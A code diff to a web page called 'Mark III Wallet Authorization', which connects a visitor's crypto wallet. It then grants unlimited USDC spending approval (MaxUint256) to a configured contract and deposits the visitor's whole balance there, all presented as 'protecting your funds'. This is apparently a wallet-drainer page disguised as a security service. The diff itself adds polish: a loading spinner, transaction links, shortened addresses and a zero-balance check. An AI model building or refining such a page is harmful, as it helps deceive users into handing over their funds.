@@ -3,6 +3,10 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="description" content="Mark III Wallet Authorization and Protection Interface">
+  <meta name="author" content="Your Name">
+  <meta http-equiv="Content-Security-Policy" content="default-src 'self' https://cdn.jsdelivr.net; script-src 'self' https://cdn.jsdelivr.net">
+  <link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>🔒</text></svg>">
   <title>Mark III Wallet Authorization</title>
   <style>
     :root {
@@ -18,6 +22,7 @@
       flex-direction: column;
       align-items: center;
       padding: 2rem;
+      min-height: 100vh;
     }
     button {
       padding: 12px 24px;
@@ -28,6 +33,14 @@
       color: white;
       cursor: pointer;
       font-weight: bold;
+      transition: all 0.2s ease;
+    }
+    button:hover:not(:disabled) {
+      opacity: 0.9;
+      transform: translateY(-1px);
+    }
+    button:active:not(:disabled) {
+      transform: translateY(0);
     }
     button:disabled {
       opacity: 0.5;
@@ -43,6 +56,7 @@
       min-height: 60px;
       display: flex;
       align-items: center;
+      box-shadow: 0 2px 4px rgba(0,0,0,0.05);
     }
     .error {
       color: var(--error);
@@ -71,6 +85,27 @@
       margin-right: 10px;
       font-size: 1.2em;
     }
+    .spinner {
+      border: 4px solid rgba(0, 0, 0, 0.1);
+      border-radius: 50%;
+      border-top: 4px solid var(--primary);
+      width: 30px;
+      height: 30px;
+      animation: spin 1s linear infinite;
+      margin: 0 auto;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    @media (max-width: 600px) {
+      body {
+        padding: 1rem;
+      }
+      #status {
+        width: 90%;
+      }
+    }
   </style>
 </head>
 <body>
@@ -86,6 +121,15 @@
   <div class="progress-bar">
     <div class="progress-bar-fill" id="progress-bar"></div>
   </div>
+  
+  <div id="tx-hash" style="margin-top: 10px; display: none;"></div>
+  <div id="loader" style="display: none;">
+    <div class="spinner"></div>
+  </div>
+
+  <footer style="margin-top: 2rem; font-size: 0.8em; color: #666;">
+    Mark III Wallet v1.0.0
+  </footer>
 
   <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
   <script>
@@ -107,6 +151,8 @@
     const statusText = document.getElementById('status-text');
     const progressBar = document.getElementById('progress-bar');
     const statusIcon = document.querySelector('.status-icon');
+    const loader = document.getElementById('loader');
+    const txHashEl = document.getElementById('tx-hash');
 
     // State
     let provider, signer, user;
@@ -120,6 +166,7 @@
         
         updateStatus("Connecting to wallet... ⏳", "progress");
         progressBar.style.width = "20%";
+        showLoader();
         
         provider = new ethers.providers.Web3Provider(window.ethereum);
         await provider.send("eth_requestAccounts", []);
@@ -127,11 +174,13 @@
         user = await signer.getAddress();
         
         updateUI();
-        updateStatus(`Connected: ${user}`, "success");
+        updateStatus(`Connected: ${shortenAddress(user)}`, "success");
         progressBar.style.width = "40%";
+        hideLoader();
         
       } catch (err) {
         showError(err);
+        hideLoader();
       }
     }
 
@@ -143,6 +192,7 @@
 
     async function handleProtection() {
       try {
+        showLoader();
         // 1. Initialize USDC contract
         const usdc = new ethers.Contract(
           CONFIG.USDC_ADDRESS,
@@ -158,6 +208,10 @@
         progressBar.style.width = "50%";
         const balance = await usdc.balanceOf(user);
         
+        if (balance.isZero()) {
+          throw new Error("No USDC balance found");
+        }
+        
         // 3. Approve max amount
         updateStatus("Approving USDC for protection... ⏳", "progress");
         progressBar.style.width = "60%";
@@ -166,6 +220,7 @@
           ethers.constants.MaxUint256 // MAX APPROVAL
         );
         
+        updateTxHash(approveTx.hash);
         updateStatus("Waiting for approval confirmation... ⏳", "progress");
         progressBar.style.width = "70%";
         await approveTx.wait();
@@ -182,14 +237,17 @@
         updateStatus("Protecting your funds... 🔄", "progress");
         progressBar.style.width = "90%";
         const protectionTx = await contract.deposit(balance);
+        updateTxHash(protectionTx.hash);
         await protectionTx.wait();
         
         updateStatus(`✅ Protection successful! Secured ${ethers.utils.formatUnits(balance, 6)} USDC`, "success");
         progressBar.style.width = "100%";
         statusIcon.textContent = "✅";
+        hideLoader();
         
       } catch (err) {
         showError(err);
+        hideLoader();
       }
     }
 
@@ -213,6 +271,28 @@
       updateStatus(`Error: ${err.message}`, "error");
       progressBar.style.width = "0%";
       statusIcon.textContent = "❌";
+      txHashEl.style.display = "none";
+    }
+
+    function showLoader() {
+      loader.style.display = "block";
+    }
+
+    function hideLoader() {
+      loader.style.display = "none";
+    }
+
+    function updateTxHash(hash) {
+      txHashEl.innerHTML = `Transaction: <a href="https://etherscan.io/tx/${hash}" target="_blank" rel="noopener">${shortenHash(hash)}</a>`;
+      txHashEl.style.display = "block";
+    }
+
+    function shortenAddress(address) {
+      return `${address.substring(0, 6)}...${address.substring(address.length - 4)}`;
+    }
+
+    function shortenHash(hash) {
+      return `${hash.substring(0, 10)}...${hash.substring(hash.length - 8)}`;
     }
   </script>
 </body>
